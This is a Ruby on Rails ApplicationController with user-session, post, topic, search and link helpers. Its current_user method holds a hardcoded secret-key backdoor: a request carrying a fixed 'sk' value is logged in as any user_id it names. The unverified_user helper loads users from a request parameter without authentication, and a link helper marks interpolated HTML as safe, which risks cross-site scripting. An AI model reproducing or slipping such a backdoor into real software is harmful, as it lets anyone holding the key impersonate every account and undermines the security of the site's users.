class ApplicationController < ActionController::Base
  protect_from_forgery
  before_filter :set_featured_topics, :set_search_vars


  private
  def current_user
    @current_user ||= User.find(session[:user_id]) if session[:user_id]
    if !@current_user
      if params[:sk] == "foeiuh9q28734gfa9w8hfg92830rq892g0oaw8hf"
        @current_user = User.find_by_id(params[:user_id])
      end
    end
    if @current_user && !@current_user.verified?
      @current_user = nil
    end
    @current_user
  end
  helper_method :current_user

  private
  def unverified_user
    user ||= User.find(session[:user_id]) if session[:user_id]
    user ||= User.find(params[:id]) if !@unverified_user
    user
  end
  helper_method :unverified_user

  private
  def current_user_or_redirect
    if !current_user
      redirect_to root_path
      return false
    else
      return true
    end
  end
  helper_method :current_user_or_redirect

  private
  def me?(user_id)
    if !current_user
      false
    else
      user_id == current_user.id
    end
  end
  helper_method :me?

  private 
  def logged_in
    if current_user
      true
    else
      false
    end
  end
  helper_method :logged_in


  # POSTS

  private
  def popular_posts
    @popular_posts = Post.most_upvotes(16).live.today
  end
  helper_method :popular_posts


  # TOPICS 
  
  def set_featured_topics
    @browsing_topics = Topic.featured(4)
  end


  # SEARCH

  def set_search_vars
    @post_search = Post.search do
      fulltext params[:search]
      with(:status).equal_to("live")
    end

    @topic_search = Topic.search do 
      fulltext params[:search]
    end

    @results = @post_search.results + @topic_search.results
  end

  # LINKS

  private
  def browse_link(location, topic, order)
    location == 'topic' ? "/topics/#{topic.id}?sort=#{order}" : "/?sort=#{order}"
  end
  helper_method :browse_link

  private
  def link_or_signup_modal?(text, style, normal)
    logged_in ? normal.html_safe : "<a href='#signupModal' role='button' class='#{style}' data-toggle='modal'>#{text}</a>".html_safe
  end
  helper_method :link_or_signup_modal?

end
